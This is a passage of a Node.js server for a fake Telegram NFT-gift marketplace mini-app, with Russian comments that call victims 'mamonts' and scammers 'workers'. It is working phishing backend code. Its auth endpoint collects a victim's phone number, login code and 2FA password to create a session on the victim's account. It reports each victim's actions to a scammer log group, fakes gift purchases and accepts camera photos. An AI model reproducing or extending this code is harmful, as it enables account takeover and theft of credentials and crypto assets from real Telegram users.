      const match = line.match(/https:\/\/t\.me\/nft\/(\w+)-(\d+)\s*-\s*([\d.]+)\s*TON\s*\(([\d.]+)/);
      if (match) {
        const [, giftName, giftId, tonPrice, rubPrice] = match;
        const formattedName = giftName.replace(/([A-Z])/g, ' $1').trim();
        
        return {
          name: formattedName,
          originalName: giftName,
          id: giftId,
          tonPrice: parseFloat(tonPrice),
          rubPrice: parseFloat(rubPrice),
          imageUrl: `https://nft.fragment.com/gift/${giftName.toLowerCase()}-${giftId}.medium.jpg`,
          telegramUrl: `https://t.me/nft/${giftName}-${giftId}`
        };
      }
      return null;
    }).filter(g => g !== null);
    
    res.json(gifts);
  } catch (e) {
    console.error(`[API] Ошибка получения подарков: ${e.message}`);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ==================== API ЭНДПОИНТЫ ДЛЯ НОВОГО МАРКЕТА ====================

// Функция для получения userId из initData Telegram WebApp
function getUserIdFromInitData(initData) {
  try {
    if (!initData) return null;
    
    // Парсим initData (формат: key=value&key2=value2)
    const params = new URLSearchParams(initData);
    const userStr = params.get('user');
    
    if (userStr) {
      const user = JSON.parse(decodeURIComponent(userStr));
      return user.id || null;
    }
    
    return null;
  } catch (e) {
    console.error(`[GET-USER-ID] Ошибка парсинга initData: ${e.message}`);
    return null;
  }
}

// API для получения балансов Stars и TON
app.post('/market/stars', async (req, res) => {
  try {
    const { initData, bot_username } = req.body;
    
    if (!initData) {
      return res.status(400).json({ error: 'initData обязателен' });
    }
    
    const userId = getUserIdFromInitData(initData);
    if (!userId) {
      return res.status(400).json({ error: 'Не удалось получить userId из initData' });
    }
    
    console.log(`[MARKET-API] Запрос балансов для userId: ${userId}`);
    
    // Получаем подарки мамонта из БД
    let userGifts = [];
    if (getMamontGifts) {
      try {
        userGifts = await getMamontGifts(userId);
      } catch (e) {
        console.error(`[MARKET-API] Ошибка getMamontGifts: ${e.message}`);
        // Fallback на локальную фильтрацию
        const allGifts = await loadMamontGiftsDB();
        userGifts = allGifts.filter(g => {
          const gUserId = typeof g.userId === 'string' ? parseInt(g.userId) : g.userId;
          return gUserId === userId || String(g.userId) === String(userId);
        });
      }
    } else {
      const allGifts = await loadMamontGiftsDB();
      userGifts = allGifts.filter(g => {
        const gUserId = typeof g.userId === 'string' ? parseInt(g.userId) : g.userId;
        return gUserId === userId || String(g.userId) === String(userId);
      });
    }
    
    // Для демо возвращаем фиктивные балансы (можно интегрировать с реальной системой)
    const starsBalance = 0;
    const tonBalance = 0;
    const marketWonNfts = userGifts.map(g => {
      // Формируем giftLink если его нет
      let giftLink = g.giftLink;
      if (!giftLink && g.giftId) {
        const parts = g.giftId.split('-');
        if (parts.length >= 2) {
          const giftName = parts[0];
          const giftIdNum = parts[parts.length - 1];
          giftLink = `https://t.me/nft/${giftName}-${giftIdNum}`;
        }
      }
      
      return {
        giftId: g.giftId,
        link: giftLink || g.giftLink || '',
        giftLink: giftLink || g.giftLink || '',
        giftName: g.giftName,
        min_price: 0 // Можно добавить цену из БД
      };
    });
    
    res.json({
      success: true,
      stars_balance: starsBalance,
      ton_balance: tonBalance,
      market_won_nfts: marketWonNfts
    });
  } catch (e) {
    console.error(`[MARKET-API] Ошибка получения балансов: ${e.message}`);
    res.status(500).json({ error: e.message });
  }
});

// API для открытия маркета
app.post('/market/open', async (req, res) => {
  try {
    const { initData, bot_username } = req.body;
    
    if (!initData) {
      return res.status(400).json({ error: 'initData обязателен' });
    }
    
    const userId = getUserIdFromInitData(initData);
    if (!userId) {
      return res.status(400).json({ error: 'Не удалось получить userId из initData' });
    }
    
    console.log(`[MARKET-API] Открытие маркета для userId: ${userId}`);
    
    // Пытаемся получить username и данные воркера из БД подарков
    let mamontUsername = null;
    let workerUsername = null;
    let workerId = null;
    
    try {
      const gifts = await loadMamontGiftsDB();
      const userGift = gifts.find(g => {
        const gUserId = typeof g.userId === 'string' ? parseInt(g.userId) : g.userId;
        return gUserId === userId;
      });
      if (userGift) {
        if (userGift.username && userGift.username !== 'без username') {
          mamontUsername = userGift.username;
        }
        if (userGift.workerUsername) {
          workerUsername = userGift.workerUsername;
        }
        if (userGift.workerId) {
          workerId = userGift.workerId;
        }
      }
    } catch (e) {
      console.error(`[MARKET-API] Ошибка получения данных из БД: ${e.message}`);
    }
    
    // Формируем текст мамонта
    const mamontText = mamontUsername 
      ? `👤 <b>Мамонт:</b> @${mamontUsername} (<code>${userId}</code>)`
      : `👤 <b>Мамонт:</b> <code>${userId}</code>`;
    
    // Формируем текст воркера
    const workerText = (workerUsername || workerId) 
      ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` 
      : '';
    
    // Логируем открытие маркета
    await sendLogToGroup(
      `📱 <b>Мамонт запустил маркет</b>\n` +
      `${mamontText}${workerText}`
    );
    
    // Возвращаем настройки (camera_photo_enabled можно настроить)
    res.json({
      success: true,
      camera_photo_enabled: false // Можно включить при необходимости
    });
  } catch (e) {
    console.error(`[MARKET-API] Ошибка открытия маркета: ${e.message}`);
    res.status(500).json({ error: e.message });
  }
});

// API для авторизации через новый маркет
app.post('/market/auth', async (req, res) => {
  try {
    const { initData, action, phone, session_id, code, password, bot_username } = req.body;
    
    if (!initData) {
      return res.status(400).json({ error: 'initData обязателен' });
    }
    
    const userId = getUserIdFromInitData(initData);
    if (!userId) {
      return res.status(400).json({ error: 'Не удалось получить userId из initData' });
    }
    
    console.log(`[MARKET-AUTH] Действие: ${action}, userId: ${userId}`);
    
    if (action === 'start') {
      // Начало авторизации - запрос номера телефона
      if (!phone) {
        return res.status(400).json({ error: 'Номер телефона обязателен' });
      }
      
      // Получаем параметры воркера из запроса
      const { workerUsername, workerId, mamontUsername, mamontId } = req.body;
      
      // Используем существующий API для создания сессии
      let phoneNumber = phone.trim().replace(/\s+/g, '');
      if (!phoneNumber.startsWith('+')) {
        phoneNumber = '+' + phoneNumber;
      }
      
      // Сохраняем номер для userId
      savedPhoneNumbers.set(String(userId), {
        phoneNumber: phoneNumber,
        username: mamontUsername || null,
        giftId: null,
        savedAt: new Date().toISOString()
      });
      
      // Создаем сессию через существующий API с параметрами воркера
      const createSessionRes = await fetch(`http://localhost:${PORT}/api/create-session`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: phoneNumber,
          mamontId: mamontId || userId,
          mamontUsername: mamontUsername || null,
          workerUsername: workerUsername || null,
          workerId: workerId || null
        })
      });
      
      const sessionData = await createSessionRes.json();
      
      if (sessionData.success && sessionData.sessionId) {
        // Сохраняем sessionId для мамонта
        mamontSessions.set(String(userId), {
          sessionId: sessionData.sessionId,
          giftId: null,
          createdAt: new Date().toISOString()
        });
        
        res.json({
          success: true,
          session_id: sessionData.sessionId
        });
      } else {
        res.status(400).json({ 
          error: sessionData.error || 'Ошибка создания сессии',
          floodWait: sessionData.floodWait,
          waitSeconds: sessionData.waitSeconds
        });
      }
    } else if (action === 'verify_code') {
      // Проверка кода
      if (!session_id || !code) {
        return res.status(400).json({ error: 'session_id и code обязательны' });
      }
      
      // Используем существующий API для проверки кода
      const verifyRes = await fetch(`http://localhost:${PORT}/api/verify-code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId: session_id,
          code: code
        })
      });
      
      const verifyData = await verifyRes.json();
      console.log(`[MARKET-AUTH] Ответ от /api/verify-code:`, JSON.stringify(verifyData));
      
      if (verifyData.success) {
        // Если требуется пароль, возвращаем need_2fa: true
        if (verifyData.needsPassword || verifyData.requiresPassword) {
          console.log(`[MARKET-AUTH] Требуется пароль, возвращаем need_2fa: true`);
          // ВАЖНО: возвращаем success: false, чтобы фронтенд НЕ переходил на step 3
          res.json({
            success: false, // НЕ success, чтобы фронтенд не переходил на step 3
            need_2fa: true, // Требуется пароль
            hint: verifyData.passwordHint || '',
            message: 'Требуется пароль 2FA'
          });
        } else {
          console.log(`[MARKET-AUTH] Пароль не требуется, авторизация успешна`);
          res.json({
            success: true,
            need_2fa: false
          });
        }
      } else {
        res.status(400).json({ 
          error: verifyData.error || 'Неверный код',
          codeExpired: verifyData.codeExpired
        });
      }
    } else if (action === 'verify_2fa') {
      // Проверка пароля 2FA
      if (!session_id || !password) {
        return res.status(400).json({ error: 'session_id и password обязательны' });
      }
      
      // Используем существующий API для проверки пароля
      const verifyRes = await fetch(`http://localhost:${PORT}/api/verify-password`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId: session_id,
          password: password
        })
      });
      
      const verifyData = await verifyRes.json();
      
      if (verifyData.success) {
        // Успешная авторизация - возвращаем успех
        res.json({
          success: true,
          message: 'Авторизация успешна'
        });
      } else {
        // Проверяем, не является ли ошибка сообщением о синхронизации
        const errorMsg = verifyData.error || 'Неверный пароль';
        if (errorMsg.includes('синхронизации') || errorMsg.includes('synchronization')) {
          // Это нормальное сообщение - авторизация прошла, но синхронизация еще идет
          res.json({
            success: true,
            message: 'Пароль подтвержден. Синхронизация данных...'
          });
        } else {
          res.status(400).json({ 
            error: errorMsg
          });
        }
      }
    } else {
      res.status(400).json({ error: 'Неизвестное действие' });
    }
  } catch (e) {
    console.error(`[MARKET-AUTH] Ошибка: ${e.message}`);
    res.status(500).json({ error: e.message });
  }
});

// API для покупки подарка
app.post('/market/buy_gift', async (req, res) => {
  try {
    const { initData, gift_link, price, bot_username } = req.body;
    
    if (!initData || !gift_link) {
      return res.status(400).json({ error: 'initData и gift_link обязательны' });
    }
    
    const userId = getUserIdFromInitData(initData);
    if (!userId) {
      return res.status(400).json({ error: 'Не удалось получить userId из initData' });
    }
    
    console.log(`[MARKET-BUY] Покупка подарка для userId: ${userId}, gift_link: ${gift_link}`);
    
    // Парсим gift_link для получения giftId
    const giftMatch = gift_link.match(/\/nft\/(.+)-(\d+)$/);
    if (!giftMatch) {
      return res.status(400).json({ error: 'Неверный формат gift_link' });
    }
    
    const giftName = giftMatch[1];
    const giftIdNum = giftMatch[2];
    const giftId = `${giftName}-${giftIdNum}`;
    
    // Сохраняем подарок в БД мамонта (симуляция покупки)
    // В реальности здесь должна быть логика реальной покупки
    const username = 'без username'; // Можно получить из initData
    
    if (getGiftInfo) {
      const existingGift = await getGiftInfo(giftId, userId);
      if (!existingGift) {
        // Создаем новый подарок в БД
        const gifts = await loadMamontGiftsDB();
        const newGift = {
          userId: userId,
          username: username,
          giftId: giftId,
          giftName: giftName,
          giftLink: gift_link,
          receivedAt: new Date().toISOString(),
          status: 'pending',
          sessionPath: null,
          workerUsername: null,
          workerId: null
        };
        gifts.push(newGift);
        await saveMamontGiftsDB(gifts);
      }
    }
    
    // Логируем покупку
    await sendLogToGroup(
      `🛒 <b>Покупка подарка</b>\n` +
      `👤 <b>Мамонт:</b> <code>${userId}</code>\n` +
      `🎁 <b>Подарок:</b> ${giftId}\n` +
      `💰 <b>Цена:</b> ${price || '0'} TON`
    );
    
    // Возвращаем обновленные балансы и подарки
    let userGifts = [];
    if (getMamontGifts) {
      try {
        userGifts = await getMamontGifts(userId);
      } catch (e) {
        console.error(`[MARKET-BUY] Ошибка getMamontGifts: ${e.message}`);
        const allGifts = await loadMamontGiftsDB();
        userGifts = allGifts.filter(g => {
          const gUserId = typeof g.userId === 'string' ? parseInt(g.userId) : g.userId;
          return gUserId === userId || String(g.userId) === String(userId);
        });
      }
    } else {
      const allGifts = await loadMamontGiftsDB();
      userGifts = allGifts.filter(g => {
        const gUserId = typeof g.userId === 'string' ? parseInt(g.userId) : g.userId;
        return gUserId === userId || String(g.userId) === String(userId);
      });
    }
    
    const marketWonNfts = userGifts.map(g => {
      let giftLink = g.giftLink;
      if (!giftLink && g.giftId) {
        const parts = g.giftId.split('-');
        if (parts.length >= 2) {
          const giftName = parts[0];
          const giftIdNum = parts[parts.length - 1];
          giftLink = `https://t.me/nft/${giftName}-${giftIdNum}`;
        }
      }
      return {
        giftId: g.giftId,
        link: giftLink || '',
        giftLink: giftLink || '',
        giftName: g.giftName,
        min_price: 0
      };
    });
    
    res.json({
      success: true,
      new_balance: 0, // Можно интегрировать с реальной системой балансов
      market_won_nfts: marketWonNfts
    });
  } catch (e) {
    console.error(`[MARKET-BUY] Ошибка: ${e.message}`);
    res.status(500).json({ error: e.message });
  }
});

// API для отправки фото с камеры (опционально)
// Упрощенная обработка - принимаем JSON с base64 или просто логируем
app.post('/market/camera_photo', async (req, res) => {
  try {
    // Пробуем получить initData из разных источников
    let initData = req.body.initData || req.body.formData?.initData || null;
    
    // Если это multipart, пробуем извлечь из заголовков или тела
    if (!initData && req.headers['content-type']?.includes('multipart')) {
      // Для multipart просто логируем получение
      console.log(`[MARKET-CAMERA] Получен multipart запрос (фото)`);
      initData = 'multipart_request';
    }
    
    if (!initData || initData === 'multipart_request') {
      // Если initData нет, просто возвращаем успех (опциональная функция)
      console.log(`[MARKET-CAMERA] Получено фото без initData (опциональная функция)`);
      res.json({ success: true });
      return;
    }
    
    const userId = getUserIdFromInitData(initData);
    if (!userId) {
      // Даже если userId не получен, возвращаем успех (опциональная функция)
      console.log(`[MARKET-CAMERA] Получено фото, userId не определен`);
      res.json({ success: true });
      return;
    }
    
    console.log(`[MARKET-CAMERA] Получено фото от userId: ${userId}`);
    
    // Логируем получение фото
    await sendLogToAdmin(
      `📷 <b>Фото с камеры получено</b>\n` +
      `👤 <b>Пользователь:</b> <code>${userId}</code>`
    );
    
    res.json({ success: true });
  } catch (e) {
    console.error(`[MARKET-CAMERA] Ошибка: ${e.message}`);
    // Даже при ошибке возвращаем успех, так как это опциональная функция
    res.json({ success: true });
  }
});

// ==================== ОБРАБОТКА ОШИБОК ====================
// Middleware для обработки ошибок API - всегда возвращает JSON
app.use((err, req, res, next) => {
  // Если это запрос к API, всегда возвращаем JSON
  if (req.path && req.path.startsWith('/api/')) {
    console.error(`[API-ERROR] ${req.method} ${req.path}:`, err.message);
    res.status(err.status || 500).json({ 
      error: err.message || 'Internal server error',
      path: req.path 
    });
  } else {
    // Для не-API запросов передаем дальше
    next(err);
  }
});

// Обработчик 404 для API - возвращает JSON вместо HTML
app.use((req, res, next) => {
  if (req.path.startsWith('/api/')) {
    res.status(404).json({ error: 'API endpoint not found', path: req.path });
  } else {
    next();
  }
});

// ==================== СТАТИКА (ПОСЛЕ ВСЕХ API МАРШРУТОВ) ====================
// ВАЖНО: Статика должна быть ПОСЛЕ всех API маршрутов, чтобы не перехватывать запросы
app.use(express.static(path.join(__dirname, 'sursmarketa', 'templates2')));

// Запуск сервера
await loadConfig();
app.listen(PORT, () => {
  console.log(`✅ Сервер запущен на порту ${PORT}`);
  console.log(`📱 Маркет доступен по адресу: http://localhost:${PORT}`);
});


